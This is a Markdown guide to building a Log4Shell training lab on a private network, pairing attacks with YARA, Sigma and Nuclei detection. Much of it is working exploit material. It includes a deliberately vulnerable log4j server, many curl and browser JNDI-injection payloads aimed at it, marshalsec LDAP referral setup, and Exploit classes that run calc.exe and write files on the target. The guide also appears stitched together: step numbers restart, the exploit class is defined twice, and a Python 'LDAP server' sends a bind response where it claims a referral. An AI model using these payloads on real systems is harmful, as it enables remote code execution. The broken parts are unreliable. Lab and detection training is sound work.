# Log4Shell Security Lab - Complete Startup Guide

## Network Topology
- **Windows Host**: 10.0.0.196 (Detection Tools)
- **Vulnerable Linux VM**: 10.0.0.13 (Target - VMware)
- **Parrot OS VM**: 10.0.0.8 (Attacker)

---

## Part 1: Starting the Vulnerable Lab Environment

### On Vulnerable Linux VM (10.0.0.13)

#### Step 1: Start Docker Containers
```bash
# Navigate to lab directory
cd ~/log4shell-security-lab/

# Start all containers
docker-compose -f docker-compose-simple.yml up -d

# Verify containers are running
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
```

**Expected Output:**
```
NAMES                 STATUS        PORTS
attacker-machine      Up X seconds
ldap-exploit-server   Up X seconds   0.0.0.0:1389->1389/tcp, 0.0.0.0:8888->8888/tcp
log4shell-simple      Up X seconds   0.0.0.0:8081->8080/tcp
```

#### Step 2: Verify Services are Running
```bash
# Check vulnerable app is responding
curl http://localhost:8081

# Check LDAP server processes
docker exec ldap-exploit-server ps aux | grep python

# Check HTTP server is serving exploit class
curl -I http://localhost:8888/Exploit.class
```

#### Step 3: Test Basic JNDI Processing
```bash
# Test java version expansion (should show expanded version)
docker exec attacker-machine curl -H "User-Agent: test_\${java:version}" http://log4shell-simple:8080

# Check logs for expansion
docker logs log4shell-simple --tail 5
```

---

## Part 2: Running Attacks from Parrot OS VM

### On Parrot OS VM (10.0.0.8)

#### Step 1: Verify Network Access
```bash
# Test connectivity to vulnerable app
curl http://10.0.0.13:8081
```

**Expected Response:**
```html
<h1>Log4Shell Test Server</h1>
<p>Your request has been logged.</p>
```

#### Step 2: Basic Log4Shell Attack
```bash
# Launch Log4Shell JNDI injection attack
curl -H "User-Agent: \${jndi:ldap://10.0.0.13:1389/Exploit}" http://10.0.0.13:8081
```

#### Step 3: Advanced Attack Vectors
```bash
# Attack via X-Forwarded-For header
curl -H "X-Forwarded-For: \${jndi:ldap://10.0.0.13:1389/Exploit}" http://10.0.0.13:8081

# Attack via POST data
curl -X POST -d "username=\${jndi:ldap://10.0.0.13:1389/Exploit}" http://10.0.0.13:8081

# Attack via URL parameter
curl "http://10.0.0.13:8081/search?q=\${jndi:ldap://10.0.0.13:1389/Exploit}"

# Multiple attacks to generate logs
for i in {1..5}; do
  curl -H "User-Agent: attack_$i_\${jndi:ldap://10.0.0.13:1389/Exploit}" http://10.0.0.13:8081
  sleep 1
done
```

---

## Part 3: Detection Tools Setup on Windows Host

### On Windows Host (10.0.0.196)

#### Step 1: Create Detection Environment
```powershell
# Create detection directory
mkdir C:\Log4Shell-Detection
cd C:\Log4Shell-Detection

# Create subdirectories
mkdir rules, logs, tools
```

#### Step 2: Download Detection Rules
```powershell
# Download YARA rules
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/hasamba/Log4JLab/main/detection-rules/log4shell.yar" -OutFile "rules\log4shell.yar"

# Download Sigma rules
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/hasamba/Log4JLab/main/detection-rules/log4shell_sigma.yml" -OutFile "rules\log4shell_sigma.yml"

# Download Nuclei template
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/hasamba/Log4JLab/main/detection-rules/log4shell-nuclei.yaml" -OutFile "rules\log4shell-nuclei.yaml"
```

#### Step 3: Install Detection Tools

**Install YARA:**
```powershell
# Download YARA for Windows
Invoke-WebRequest -Uri "https://github.com/VirusTotal/yara/releases/download/v4.5.2/yara-4.5.2-2150-win64.zip" -OutFile "tools\yara.zip"
Expand-Archive tools\yara.zip -DestinationPath "tools\yara"

# Add to PATH (temporary)
$env:PATH += ";C:\Log4Shell-Detection\tools\yara"
```

**Install Nuclei:**
```powershell
# Download Nuclei for Windows
Invoke-WebRequest -Uri "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_3.4.10_windows_amd64.zip" -OutFile "tools\nuclei.zip"
Expand-Archive tools\nuclei.zip -DestinationPath "tools\nuclei"

# Add to PATH (temporary)
$env:PATH += ";C:\Log4Shell-Detection\tools\nuclei"
```

---

## Part 4: Running Detection from Windows Host

### Step 1: Collect Logs from Vulnerable VM

#### Option A: SSH Access (if available)
```powershell
# SSH to vulnerable VM and get Docker logs
ssh user@10.0.0.13 "docker logs log4shell-simple" > logs\app_logs.txt
```

#### Option B: Manual Copy
1. On Vulnerable VM, run: `docker logs log4shell-simple > /tmp/app_logs.txt`
2. Copy the file to Windows via SCP/SFTP or shared folder
3. Place in `C:\Log4Shell-Detection\logs\app_logs.txt`

### Step 2: YARA Detection
```powershell
# Navigate to detection directory
cd C:\Log4Shell-Detection

# Run YARA scan on logs
.\tools\yara\yara64.exe -r rules\log4shell.yar logs\app_logs.txt

# Scan the downloaded Exploit.class file
.\tools\yara\yara64.exe -r rules\log4shell.yar C:\Users\[USERNAME]\Downloads\Exploit.class
```

**Expected YARA Output:**
```
Log4Shell_JNDI_Lookup_Strings logs\app_logs.txt
Log4Shell_Network_IOCs logs\app_logs.txt
```

### Step 3: Nuclei Scanning
```powershell
# Run Nuclei scan against vulnerable app
.\tools\nuclei\nuclei.exe -t rules\log4shell-nuclei.yaml -u http://10.0.0.13:8081

# Verbose output
.\tools\nuclei\nuclei.exe -t rules\log4shell-nuclei.yaml -u http://10.0.0.13:8081 -v
```

**Expected Nuclei Output:**
```
[log4shell-detection] [http] [critical] http://10.0.0.13:8081
[log4shell-detection] [http] [critical] http://10.0.0.13:8081/api/v1/callback
```

### Step 4: Sigma Analysis
```powershell
# Search for JNDI patterns in logs
Select-String -Path "logs\app_logs.txt" -Pattern "\$\{jndi:(ldap|ldaps|rmi|dns)://"

# Count total detections
(Select-String -Path "logs\app_logs.txt" -Pattern "\$\{jndi:").Count

# Extract unique attack patterns
Select-String -Path "logs\app_logs.txt" -Pattern "\$\{jndi:" | Select-Object -Unique
```

---

## Part 5: Verification Commands

### Verify Lab is Working

#### On Vulnerable VM (10.0.0.13):
```bash
# Check all containers are up
docker ps

# Check LDAP server logs for connections
docker logs ldap-exploit-server --tail 10

# Verify HTTP server is serving files
curl -I http://localhost:8888/Exploit.class
```

#### From Windows Browser:
- Visit: `http://10.0.0.13:8081` (should show Log4Shell Test Server)
- Visit: `http://10.0.0.13:8888/Exploit.class` (should download file)

#### From Parrot OS:
```bash
# Confirm attack success
curl -s -H "User-Agent: \${jndi:ldap://10.0.0.13:1389/Test}" http://10.0.0.13:8081
echo "Attack sent successfully"
```

---

## Part 6: Troubleshooting

### If Containers Won't Start (Name Conflicts):
```bash
# On Vulnerable VM - Force remove existing containers
docker rm -f log4shell-simple ldap-exploit-server attacker-machine

# Start fresh
docker-compose -f docker-compose-simple.yml up -d
```

### If Other Container Issues:
```bash
# Alternative approach - clean shutdown first
docker-compose -f docker-compose-simple.yml down
docker-compose -f docker-compose-simple.yml up -d --build
```

### If LDAP Server Not Responding:
```bash
# Restart LDAP exploit server
docker restart ldap-exploit-server
sleep 5
docker logs ldap-exploit-server --tail 5
```

### If Network Access Fails:
- Verify VM network settings
- Check Windows/VM firewalls
- Confirm IP addresses: `ip addr show` (Linux) / `ipconfig` (Windows)

---

## Part 7: Clean Shutdown

### Shutdown Sequence:
```bash
# On Vulnerable VM - Stop all containers
docker-compose -f docker-compose-simple.yml down

# Optional - Clean up volumes
docker-compose -f docker-compose-simple.yml down -v
```

---

## Summary Commands Quick Reference

### Startup (Vulnerable VM):
```bash
cd ~/log4shell-security-lab/
docker-compose -f docker-compose-simple.yml up -d
docker ps
```

### Attack (Parrot OS):
```bash
curl -H "User-Agent: \${jndi:ldap://10.0.0.13:1389/Exploit}" http://10.0.0.13:8081
```

### Detection (Windows):
```powershell
cd C:\Log4Shell-Detection
.\tools\yara\yara64.exe -r rules\log4shell.yar logs\app_logs.txt
.\tools\nuclei\nuclei.exe -t rules\log4shell-nuclei.yaml -u http://10.0.0.13:8081
Select-String -Path "logs\app_logs.txt" -Pattern "\$\{jndi:"
```

---

## Part 8: Windows Native Log4Shell Exploitation Lab

### Prerequisites
- Java 8 (OpenJDK 8u172 or similar vulnerable version) ✅ CONFIRMED WORKING
- Python 3.x
- Maven (for building marshalsec)
- Git

### Step 1: Install Required Tools
```powershell
# Install Java 8 (vulnerable version)
choco install openjdk8 --version=8.0.172

# Install Maven and Git
choco install maven git

# Verify installations
java -version    # Should show 1.8.0_172 or similar
mvn -version
git --version
```

### Step 2: Create Lab Directory Structure
```powershell
# Create main lab directory
mkdir C:\Log4Shell-Lab
cd C:\Log4Shell-Lab
mkdir vulnerable-app

# Download vulnerable Log4j JARs
cd vulnerable-app
Invoke-WebRequest -Uri "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar" -OutFile "log4j-core-2.14.1.jar"
Invoke-WebRequest -Uri "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar" -OutFile "log4j-api-2.14.1.jar"
```

### Step 3: Build marshalsec (LDAP Exploit Server)
```powershell
cd C:\Log4Shell-Lab

# Clone and build marshalsec
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests

# Copy JAR to lab root
copy target\marshalsec-0.0.3-SNAPSHOT-all.jar ..\marshalsec.jar
cd ..
```

### Step 4: Create Vulnerable Java Application
Create `C:\Log4Shell-Lab\vulnerable-app\SimpleVulnerable.java`:
```java
import java.io.*;
import java.net.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class SimpleVulnerable {
    private static final Logger logger = LogManager.getLogger(SimpleVulnerable.class);

    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = new ServerSocket(8080);
        System.out.println("Log4Shell Test Server running on port 8080");

        while (true) {
            Socket clientSocket = serverSocket.accept();
            handleRequest(clientSocket);
        }
    }

    private static void handleRequest(Socket clientSocket) throws IOException {
        BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);

        String inputLine;
        String userAgent = "";
        String requestLine = "";

        while ((inputLine = in.readLine()) != null) {
            if (inputLine.startsWith("GET") || inputLine.startsWith("POST")) {
                requestLine = inputLine;
            }
            if (inputLine.toLowerCase().startsWith("user-agent:")) {
                userAgent = inputLine.substring(12).trim();
            }
            if (inputLine.isEmpty()) break;
        }

        // Vulnerable logging - logs user input directly
        logger.info("Request: " + requestLine);
        logger.info("User-Agent: " + userAgent);

        // Send HTTP response
        out.println("HTTP/1.1 200 OK");
        out.println("Content-Type: text/html");
        out.println();
        out.println("<h1>Log4Shell Test Server</h1>");
        out.println("<p>Your request has been logged.</p>");

        clientSocket.close();
    }
}
```

### Step 5: Create Log4j Configuration
Create `C:\Log4Shell-Lab\vulnerable-app\log4j2.xml`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
    </Appenders>
    <Loggers>
        <Root level="info">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>
```

### Step 6: Compile Vulnerable Application
```powershell
cd C:\Log4Shell-Lab\vulnerable-app

# Compile the vulnerable application
javac -cp "log4j-core-2.14.1.jar;log4j-api-2.14.1.jar;." SimpleVulnerable.java
```

### Step 7: Create LDAP Exploit Server
Create `C:\Log4Shell-Lab\ldap-server\ldap_server.py`:
```python
import socket
import struct
import threading
import http.server
import socketserver
import os

# Simple LDAP Server for Log4Shell demonstration
class SimpleLDAPServer:
    def __init__(self, host='0.0.0.0', port=1389, http_port=8888):
        self.host = host
        self.port = port
        self.http_port = http_port

    def handle_ldap(self, conn, addr):
        try:
            print(f"[LDAP] Connection from {addr}")
            data = conn.recv(1024)

            # Simple LDAP response with referral to HTTP server
            # This is a basic LDAP referral response
            referral_url = f"http://{socket.gethostname()}:{self.http_port}/Exploit.class"

            # Basic LDAP result with referral
            response = bytearray([
                0x30, 0x0c,  # Sequence
                0x02, 0x01, 0x01,  # Message ID
                0x61, 0x07,  # Application 1 (Bind Response)
                0x0a, 0x01, 0x00,  # Result Code: Success
                0x04, 0x00,  # Matched DN: empty
                0x04, 0x00   # Error Message: empty
            ])

            conn.sendall(bytes(response))
            print(f"[LDAP] Sent referral response")

        except Exception as e:
            print(f"[LDAP] Error: {e}")
        finally:
            conn.close()

    def start_ldap_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        print(f"[LDAP] Server listening on {self.host}:{self.port}")

        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=self.handle_ldap, args=(conn, addr))
            thread.daemon = True
            thread.start()

    def run(self):
        # Start LDAP server in thread
        ldap_thread = threading.Thread(target=self.start_ldap_server)
        ldap_thread.daemon = True
        ldap_thread.start()

        # Start HTTP server in main thread
        self.start_http_server()

    def start_http_server(self):
        os.chdir(os.path.dirname(os.path.abspath(__file__)))

        class ExploitHTTPHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                print(f"[HTTP] Request: {self.path} from {self.client_address}")
                if self.path == '/Exploit.class':
                    try:
                        with open('Exploit.class', 'rb') as f:
                            content = f.read()
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/java-vm')
                        self.send_header('Content-Length', str(len(content)))
                        self.end_headers()
                        self.wfile.write(content)
                        print("[HTTP] Served Exploit.class")
                    except FileNotFoundError:
                        self.send_error(404, "Exploit.class not found")
                else:
                    super().do_GET()

            def log_message(self, format, *args):
                print(f"[HTTP] {format % args}")

        with socketserver.TCPServer(("", self.http_port), ExploitHTTPHandler) as httpd:
            print(f"[HTTP] Server listening on port {self.http_port}")
            httpd.serve_forever()

if __name__ == "__main__":
    server = SimpleLDAPServer()
    try:
        server.run()
    except KeyboardInterrupt:
        print("\n[*] Shutting down servers...")
```

### Step 8: Create Malicious Java Class
Create `C:\Log4Shell-Lab\ldap-server\Exploit.java`:
```java
public class Exploit {
    static {
        try {
            // Create a file to prove exploitation
            java.io.File file = new java.io.File("C:\\temp\\pwned.txt");
            file.getParentFile().mkdirs();
            java.io.FileWriter writer = new java.io.FileWriter(file);
            writer.write("Log4Shell exploit successful! " + new java.util.Date());
            writer.close();
            System.out.println("[EXPLOIT] Created pwned file at C:\\temp\\pwned.txt");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### Step 9: Compile Exploit Class
```powershell
cd C:\Log4Shell-Lab\ldap-server
javac Exploit.java
```

### Step 10: Start the Lab Environment

### Step 6: Create Malicious Java Payload
Create `C:\Log4Shell-Lab\Exploit.java`:
```java
import java.io.*;

public class Exploit {
    static {
        try {
            System.out.println("\n============================================================");
            System.out.println("[!!!] LOG4SHELL EXPLOIT EXECUTED [!!!]");
            System.out.println("============================================================");

            // Launch calculator as visual proof
            try {
                Runtime.getRuntime().exec("calc.exe");
                System.out.println("[+] Launched calc.exe");
            } catch (Exception e) {
                System.out.println("[!] Could not launch calc.exe: " + e.getMessage());
            }

            // Create proof file in project folder
            String projectPath = "C:\\Log4Shell-Lab\\PWNED_LOG4SHELL.txt";
            try {
                File file = new File(projectPath);
                FileWriter writer = new FileWriter(file);
                writer.write("=== LOG4SHELL EXPLOIT SUCCESS ===\n");
                writer.write("Time: " + new java.util.Date() + "\n");
                writer.write("User: " + System.getProperty("user.name") + "\n");
                writer.write("Java: " + System.getProperty("java.version") + "\n");
                writer.write("OS: " + System.getProperty("os.name") + "\n");
                writer.write("=================================\n");
                writer.close();
                System.out.println("[+] Created proof file: " + projectPath);
            } catch (Exception e) {
                System.out.println("[!] Could not write file: " + e.getMessage());
            }

            System.out.println("============================================================\n");
        } catch (Exception e) {
            System.out.println("[!] Exploit error: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
```

### Step 7: Compile Everything
```powershell
cd C:\Log4Shell-Lab

# Compile vulnerable application
cd vulnerable-app
javac -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar;." SimpleVulnerable.java

# Compile exploit payload
cd ..
javac Exploit.java
```

## ✅ EXPLOITATION DEMO - WORKING COMMANDS

### Terminal 1 - Start Vulnerable Application:
```powershell
cd C:\Log4Shell-Lab\vulnerable-app

# Start with ALL required JVM flags for Java 8
java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true" "-Dcom.sun.jndi.rmi.object.trustURLCodebase=true" "-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true" SimpleVulnerable
```

### Terminal 2 - Start marshalsec LDAP Server:
```powershell
cd C:\Log4Shell-Lab

# Start LDAP server (marshalsec)
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

### Terminal 3 - Start HTTP Server:
```powershell
cd C:\Log4Shell-Lab

# Serve malicious class file
python -m http.server 8888
```

### Terminal 4 - Launch Exploits:

#### Local Attack:
```powershell
# Test basic JNDI expansion (should show Java version)
curl -H "User-Agent: `${java:version}" http://localhost:8080

# Launch Log4Shell exploit
curl -H "User-Agent: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080

# Alternative attack vectors
curl -H "X-Forwarded-For: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
curl -X POST -d "username=`${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
curl "http://localhost:8080/?search=`${jndi:ldap://127.0.0.1:1389/Exploit}"
```

#### Remote Attack (from another machine):
```powershell
# Replace YOUR_VM_IP with actual target IP

# User-Agent attack
curl -H "User-Agent: `${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/

# URL parameter attack
curl "http://YOUR_VM_IP:8080/?user=\${jndi:ldap://YOUR_VM_IP:1389/Exploit}"

# POST data attack
curl -X POST -d "login=\${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/

# Custom header attacks
curl -H "X-Forwarded-For: \${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
curl -H "X-Real-IP: \${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
curl -H "Referer: \${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
```

#### Browser Attack (simplest):
Just paste this URL in any browser:
```
http://YOUR_VM_IP:8080/?q=${jndi:ldap://YOUR_VM_IP:1389/Exploit}
```

## ✅ SUCCESS INDICATORS

When the exploit works, you should see:
1. **Calculator launches** on target machine
2. **LDAP server** shows: `Send LDAP reference result for Exploit`
3. **HTTP server** shows: `127.0.0.1 - - [date] "GET /Exploit.class HTTP/1.1" 200`
4. **Vulnerable app** shows: `[!!!] LOG4SHELL EXPLOIT EXECUTED [!!!]`
5. **File created**: `C:\Log4Shell-Lab\PWNED_LOG4SHELL.txt`

## 🛡️ DETECTION COMMANDS

### YARA Detection:
```powershell
# Download YARA rules
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/hasamba/Log4JLab/main/detection-rules/log4shell.yar" -OutFile "log4shell.yar"

# Scan logs for malicious patterns
yara64.exe -r log4shell.yar app_logs.txt
```

### Nuclei Scanning:
```powershell
# Download Nuclei template
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/hasamba/Log4JLab/main/detection-rules/log4shell-nuclei.yaml" -OutFile "log4shell-nuclei.yaml"

# Scan for vulnerability
nuclei.exe -t log4shell-nuclei.yaml -u http://localhost:8080
```

### Network Monitoring:
```powershell
# Monitor LDAP connections
netstat -an | findstr 1389

# Monitor HTTP requests
netstat -an | findstr 8888

# Test JNDI expansion
curl -H "User-Agent: test_${java:version}" http://localhost:8080

# Launch Log4Shell attack
curl -H "User-Agent: ${jndi:ldap://localhost:1389/Exploit}" http://localhost:8080
```

### Step 12: Verify Exploitation
```powershell
# Check if exploit file was created
dir C:\temp\pwned.txt
type C:\temp\pwned.txt
```

### Step 13: Detection on Windows

#### Install Detection Tools:
```powershell
# Install YARA
winget install VirusTotal.YARA

# Install Nuclei
winget install ProjectDiscovery.Nuclei

# Or download manually from GitHub releases
```

#### Run Detection:
```powershell
# Save application output to file
java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" SimpleVulnerable > app_logs.txt 2>&1

# Run YARA detection
yara64.exe -r detection-rules\log4shell.yar app_logs.txt

# Run Nuclei scan
nuclei.exe -t detection-rules\log4shell-nuclei.yaml -u http://localhost:8080
```

### Cleanup
```powershell
# Stop servers with Ctrl+C
# Remove created files
rmdir /s C:\Log4Shell-Lab
del C:\temp\pwned.txt
```

This completes your Log4Shell Security Lab setup! 🛡️